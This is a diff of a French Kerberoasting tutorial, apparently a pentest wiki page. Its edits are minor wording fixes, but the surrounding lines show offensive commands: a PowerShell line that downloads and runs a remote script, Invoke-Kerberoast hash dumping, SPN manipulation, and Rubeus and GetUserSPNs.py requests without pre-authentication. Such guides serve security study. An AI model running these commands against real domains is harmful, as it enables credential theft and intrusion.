@@ -83,7 +83,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 > [!WARNING]
-> Lorsqu'un TGS est demandé, l'événement Windows `4769 - Un ticket de service Kerberos a été demandé` est généré.
+> Lorsqu'un TGS est demandé, l'événement Windows `4769 - A Kerberos service ticket was requested` est généré.
 
 ### Cracking
 ```bash
@@ -99,7 +99,7 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whatever
 ```
 Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici : [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Si vous trouvez cette **erreur** sur Linux : **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, c'est à cause de votre heure locale, vous devez synchroniser l'hôte avec le DC. Il existe quelques options :
+Si vous trouvez cette **erreur** sous Linux : **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, c'est à cause de votre heure locale, vous devez synchroniser l'hôte avec le DC. Il existe quelques options :
 
 - `ntpdate <IP du DC>` - Obsolète depuis Ubuntu 16.04
 - `rdate -n <IP du DC>`
@@ -125,7 +125,7 @@ En mettant en œuvre ces mesures, les organisations peuvent réduire considérab
 
 ## Kerberoast sans compte de domaine
 
-En **septembre 2022**, un nouveau moyen d'exploiter un système a été mis en lumière par un chercheur nommé Charlie Clark, partagé via sa plateforme [exploit.ph](https://exploit.ph/). Cette méthode permet l'acquisition de **tickets de service (ST)** via une requête **KRB_AS_REQ**, qui ne nécessite remarquablement pas de contrôle sur un compte Active Directory. Essentiellement, si un principal est configuré de manière à ne pas nécessiter de pré-authentification—un scénario similaire à ce qui est connu dans le domaine de la cybersécurité comme une attaque **AS-REP Roasting**—cette caractéristique peut être exploitée pour manipuler le processus de requête. Plus précisément, en modifiant l'attribut **sname** dans le corps de la requête, le système est trompé pour émettre un **ST** plutôt que le Ticket Granting Ticket (TGT) chiffré standard.
+En **septembre 2022**, un nouveau moyen d'exploiter un système a été mis en lumière par un chercheur nommé Charlie Clark, partagé via sa plateforme [exploit.ph](https://exploit.ph/). Cette méthode permet l'acquisition de **tickets de service (ST)** via une requête **KRB_AS_REQ**, qui ne nécessite remarquablement pas de contrôle sur un compte Active Directory. Essentiellement, si un principal est configuré de manière à ne pas nécessiter de pré-authentification—un scénario similaire à ce qui est connu dans le domaine de la cybersécurité comme une **attaque AS-REP Roasting**—cette caractéristique peut être exploitée pour manipuler le processus de requête. Plus précisément, en modifiant l'attribut **sname** dans le corps de la requête, le système est trompé pour émettre un **ST** plutôt que le Ticket Granting Ticket (TGT) chiffré standard.
 
 La technique est entièrement expliquée dans cet article : [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -140,7 +140,7 @@ GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "d
 ```
 #### Windows
 
-- [GhostPack/Rubeus de la PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+- [GhostPack/Rubeus de PR #139](https://github.com/GhostPack/Rubeus/pull/139):
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
